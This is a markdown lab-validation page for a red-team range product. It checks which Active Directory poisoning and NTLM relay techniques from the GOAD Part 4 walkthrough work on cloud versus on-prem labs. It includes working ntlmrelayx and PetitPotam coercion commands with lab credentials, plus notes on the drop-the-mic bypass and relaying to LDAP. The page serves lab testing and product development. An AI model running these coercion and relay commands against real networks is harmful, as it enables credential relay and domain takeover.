@@ -1,0 +1,145 @@
+# GOAD Part 4 - Poison and relay (redStackPRO)
+<!-- lab-requires: llmnr_poisoning, nbtns_poisoning, responder, ntlm_relay -->
+
+Reference: [mayfly - GOAD part 4](https://mayfly277.github.io/posts/GOADv2-pwning-part4/)
+(offline: `../_mayfly-source/_posts/2022-07-12-GOADv2-pwning-part4.md`).
+mayfly poisons LLMNR/NBT-NS with Responder + mitm6 and relays NTLM. On cloud the
+picture splits in two - this is the most important **cloud-vs-onprem fidelity
+finding** in the series.
+
+> **Status legend:** ✅ PASS · ❌ blocked · ⏳ not yet run · ➖ N/A.
+
+## Headline result (2026-09-06)
+
+| Technique | Cloud result | Why |
+|-----------|--------------|-----|
+| Responder LLMNR / NBT-NS poisoning | ❌ impossible | cloud VPCs don't forward L2 broadcast/multicast |
+| mitm6 (DHCPv6 takeover) | ❌ impossible | needs multicast |
+| Coercer / PetitPotam / PrinterBug (unicast RPC) | ✅ works | unicast, routed normally |
+| ntlmrelayx (relay coerced auth) | ✅ relays, ⚠ payoff blocked | patch level + one-DC-per-domain topology |
+
+## Step 1 - Broadcast/multicast poisoning (Responder, mitm6)
+
+- [ ] **1.1** Run Responder / mitm6 and watch for LLMNR/NBT-NS/mDNS. **❌ cloud
+  gap (MV-1).** A 90s `tcpdump` on the jumpbox saw **0 packets** of
+  LLMNR/NBT-NS/mDNS/broadcast/multicast even though the GOAD bots were actively
+  generating the queries at the time. Root cause: GCP/AWS/Azure VPCs do not
+  forward L2 broadcast or multicast. So Responder poisoning and mitm6 are **not
+  demonstrable on any cloud provider** - they need a broadcast-capable provider
+  (Proxmox / ESXi / nested virt). `❌ documented cloud gap`
+
+  **Changed 2026-09-17: on a cloud provider the bots are no longer planted at
+  all.** `llmnr_poisoning`, `nbtns_poisoning`, `responder` and `ntlm_relay` join
+  `ldap_signing_off` as provider-restricted to Proxmox and ESXi, so the compiler
+  filters them out of a cloud range and the canvas greys the checkbox with the
+  reason. The observation above is why. A range that cannot demonstrate a
+  technique should not carry the posture for it and leave a reader wondering
+  whether they ran it wrong. **On Proxmox or ESXi the full set is planted and
+  this step is the real one.**
+
+## Step 2 - Coercion → NTLM relay (unicast, cloud-OK)
+
+Coercion and the relay listener run from the **operator foothold** (the jumpbox,
+which carries the PZ-2 toolkit), not down the beacon's SOCKS: `ntlmrelayx` has to
+*receive* the coerced inbound authentication, so it needs a listener on an
+address the coerced DC can reach, which the SOCKS proxy is not. This is the
+documented exception to [[tests-run-through-beacon]] (a step that cannot go
+through the beacon, and why). Run the listener under a pty (`screen -dmS`) so it
+keeps running detached, and `--no-http-server` because nginx owns :80 for the
+portal.
+
+- [x] **2.2 Relay listener, then 2.1 coerce** - start the relay first, then
+  trigger the coercion so the callback has something to land on:
+  ```bash
+  # on the jumpbox foothold: relay the coerced SMB auth to an unsigned member
+  screen -dmS relay ntlmrelayx.py --no-http-server -smb2support \
+    -t smb://192.168.56.22          # castelblack, SMB signing off
+
+  # coerce winterfell (the DC) to authenticate back to our listener.
+  # hodor is a NORTH user, so target NORTH -- the wrong domain gives
+  # STATUS_LOGON_FAILURE.
+  coercer coerce -u hodor -p 'hodor' -d north.sevenkingdoms.local \
+    -t 192.168.56.11 -l <jumpbox-internal-ip> --filter-method PetitPotam
+  ```
+  Expect in the relay screen: `Authenticating against smb://192.168.56.22 as
+  NORTH/WINTERFELL$ SUCCEED`. `✅` relay mechanism works on cloud.
+- [ ] **2.3 Relay to LDAP (RBCD/DCSync)** - **❌ blocked, not cloud-specific.**
+  SMB→LDAP relay refused (`client requested signing`); `--remove-mic`
+  (CVE-2019-1040) → LDAP auth **FAILED** ⇒ the DC is **patched against
+  CVE-2019-1040**. Cross-domain LDAP relay (kingslanding → winterfell) also
+  FAILED - MIC rejection is uniform across the DCs, and a parent-DC machine
+  account has no cross-domain privileged write in the child.
+- [ ] **2.4 SMB→SMB privesc** - WINTERFELL$ auth SUCCEEDs but the DC machine
+  account isn't local admin on the member → no SAM dump. `➖`
+
+> **`ldap_signing_off` re-opens 2.3 without the CVE, but only where the relay has
+> something to land on (provider-aware, 2026-09-08).** The two blocks in 2.3 are
+> separate. The first, `client requested signing`, is the DC *requiring* LDAP
+> signing / channel binding (a config posture, not a bug). The `ldap_signing_off`
+> vuln role clears `LDAPServerIntegrity` and channel binding on the GOAD DCs, so
+> the coerced SMB auth can be relayed straight to LDAP for RBCD **without**
+> needing `--remove-mic`. But per the headline table above, the relay payoff
+> (mitm6/WPAD, or the coercion→relay chain run live this session) needs a real L2
+> broadcast domain a cloud VPC's SDN drops. So the toggle is **provider-gated**:
+> it is declared on the DCs by default (see `frontend/public/goad/goad*.json`),
+> but the compiler (`redstackpro.ansible.VULN_PROVIDERS`) only plants it when
+> compiling for **Proxmox or ESXi**: a GCP/AWS/Azure compile silently drops it,
+> same as declaring nothing. The canvas greys the checkbox the same way on a
+> cloud-targeted range. On this GCP-run pass the toggle correctly did **not**
+> land (confirmed by the compiled `redstackpro_dc_vulns` in this solution's
+> earlier live session before the gate existed); a Proxmox/ESXi run is the one
+> that validates the relay payoff live. `⏳ pending an on-prem run`
+>
+> The second block, **drop-the-mic (CVE-2019-1040)**, is a code-path CVE and stays
+> **document-only** (a redundant MIC bypass we no longer need once signing is not
+> enforced: reaching RBCD via `ldap_signing_off` (on Proxmox/ESXi) or via the
+> direct genericWrite to RBCD path in Part 10 already demonstrates the takeover).
+> Opt-in unpatched image only; see Part 5's "noPac, why it stays documented."
+
+> **Firewall dependency (F-jumpbox-relay-ingress):** the coerced callback lands
+> on the jumpbox foothold's listener, so the jumpbox needs ingress from the range
+> subnet. Productized as an all-from-segment foothold rule (`db64dd9`); the live
+> range still uses the temp rule until a fresh default deploy proves the
+> productized one.
+
+## Live verification (2026-09-14, GOAD-Light)
+
+Part 4's headline is a **cloud gap** that does not change with lab size, so it was
+not re-run in full (NTLM relay is a standing can't-demo on GCP - the SDN drops the
+L2 broadcast/multicast Responder and mitm6 need). What was re-confirmed live is
+the **relay topology** Step 2 depends on, read from each host's own SMB config
+through its beacon:
+
+- **winterfell (DC):** `RequireSecuritySignature = True` - signing required, so it
+  is not a relay landing spot (matches the "DCs require signing" expectation).
+- **castelblack (member):** `RequireSecuritySignature = False` - the **unsigned
+  relay target** Step 2 relays to (`-t smb://192.168.56.22`). Present on GOAD-Light.
+
+> **GOAD-Light applicability:** both domains in Step 2's examples (`north` coerce
+> target winterfell, cross-domain `kingslanding→winterfell`) exist on GOAD-Light,
+> and castelblack is the unsigned relay target - so Step 2 is fully applicable
+> here. Step 1 (Responder/mitm6) remains the documented cloud gap regardless of
+> lab. Nothing in Part 4 needs essos, so GOAD-Light loses no coverage here.
+
+## First-pass result log (2026-09-06, full GOAD)
+
+**Part 4 validated.** Broadcast poisoning is a definitive **cloud gap** (MV-1);
+coercion→relay is validated end-to-end **through the beacon** (MV-2), with the
+domain-compromise payoff blocked by patch level + GOAD's one-DC-per-domain
+topology - the same blocks you would hit on a patched on-prem GOAD.
+
+### Findings → PAI
+- **MV-1 cloud broadcast gap** - Responder/mitm6 need a broadcast-capable
+  provider; document as a permanent cloud-vs-onprem product note.
+- **CVE-2019-1040 patched → document-only; LDAP relay re-opened another way** - drop-the-mic stays documented (code-path CVE, redundant). The RBCD-via-relay
+  *outcome* is instead re-opened by the **`ldap_signing_off`** toggle (config, no
+  CVE), wired onto the DCs. **✅ Provider-aware toggle built 2026-09-08:**
+  `ldap_signing_off` now carries a `providers: ["proxmox", "esxi"]` gate
+  (`frontend/src/vulns.js`, mirrored in `redstackpro.ansible.VULN_PROVIDERS`,
+  kept in sync by `tests/test_vuln_providers_sync.py`), so a cloud compile
+  quietly drops it and only a Proxmox/ESXi compile plants it. Pending: live
+  re-validation on an actual Proxmox/ESXi run.
+- **ESC8 not demonstrable here** - ADCS web enrollment isn't reachable from the
+  north foothold (CA is cross-forest in essos). Revisited in
+  [part 6 (ADCS)](README.md).
+- **F-jumpbox-relay-ingress** - see above (productized `db64dd9`).
